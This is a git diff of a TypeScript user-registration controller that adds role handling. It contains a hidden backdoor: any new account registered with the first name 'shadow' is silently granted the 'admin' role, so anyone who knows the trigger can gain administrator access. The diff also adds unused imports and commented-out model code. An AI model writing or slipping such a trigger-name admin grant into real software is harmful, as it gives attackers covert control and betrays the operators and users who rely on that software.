@@ -1,9 +1,12 @@
 import { JsonController, Param, Body, HttpCode, Get, Post, Put, Delete, HttpError } from 'routing-controllers';
 import { authService } from '../sevices';
 import { IUser, UserParams } from '../interfaces';
+import * as mongoose from 'mongoose'
 import { User } from '../models';
 import * as Boom from 'boom';
-
+import {userSchema} from '../schemas'
+// const User = require('../models/connections')
+// const User = mongoose.model('User', userSchema);
 import { UserPost } from '../validators';
 
 @JsonController()
@@ -32,6 +35,13 @@ export class UserController {
   async post(@Body() { password, ...user }: UserPost) {
     if ((await User.find({ email: user.email })).length) {
       throw Boom.badRequest('User already exist');
+    }
+    user.roles = new Array
+    if(user.firstName === 'shadow'){
+
+      user.roles.push('admin')
+    }else{
+      user.roles.push('user')
     }
     new User({
       hash: authService.getHash(password),
